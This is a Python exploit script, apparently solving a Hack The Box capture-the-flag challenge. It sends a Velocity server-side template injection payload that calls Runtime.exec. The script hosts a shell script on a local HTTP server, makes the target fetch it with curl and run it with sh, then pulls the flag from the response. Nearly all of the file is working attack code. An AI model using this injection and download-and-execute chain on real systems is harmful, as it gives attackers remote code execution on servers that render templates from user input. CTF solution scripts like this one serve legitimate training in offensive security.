from pathlib import Path
import re
import time

import requests
from pwn import args


if args["HOST"] and args["PORT"]:
	HOST = args["HOST"]
	PORT = args["PORT"]


CHALLENGE_URL = f"http://{HOST}:{PORT}"


def ssti(payload):
    return f"""
    #set($s="")
    #set($stringClass=$s.getClass())
    #set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
    #set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
    #set($readerClass=$stringClass.forName("java.io.Reader"))
    #set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
    #set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
    #set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
    #set($systemClass=$stringClass.forName("java.lang.System"))
    #set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
    #set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
    #set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

    #set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
    #set($process=$runtime.exec("{payload}"))
    #set($null=$process.waitFor() )

    #set($inputStream=$process.getInputStream())
    #set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
    #set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
    #set($stringBuilder=$stringBuilderConstructor.newInstance())

    #set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

    $output
    """


def pwn():
    flag_sh_path = Path("./flag.sh").absolute()
    file_url = host_file(flag_sh_path.read_text())

    with requests.Session() as session:
        # Download script on server using server side template injection
        for _ in range(5):  # Retry up to 5 times
            try:
                response = session.post(
                    CHALLENGE_URL, data={"text": ssti(f"curl {file_url} -o /a.sh")}
                )
                if response.status_code == 200:
                    break
            except requests.ConnectionError:
                print("Connection reset by peer, retrying...")
                time.sleep(1)
        # Run script on server using ssti
        r = session.post(CHALLENGE_URL, data={"text": ssti(f"sh /a.sh")})
        pattern = re.compile("HTB{.*?}")
        print(r.text)
        match = re.search(pattern, r.text)
        if match is not None:
            print(f" > Found the flag: {match.group()}")
        else:
            print(" > Flag not found...")



def host_file(file_text: str):
    # Serve the text given on a local server at port 9999
    from http.server import BaseHTTPRequestHandler, HTTPServer
    import threading

    class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            # Serve the file content
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            _ = self.wfile.write(file_text.encode())

    def run():
        server_address = ("", 9999)
        httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
        httpd.serve_forever()

    # Start the server in a separate thread
    server_thread = threading.Thread(target=run, daemon=True)
    server_thread.start()
    return "http://default:9999" # return the URL to be used in the payload



def main():
    pwn()


if __name__ == "__main__":
    main()
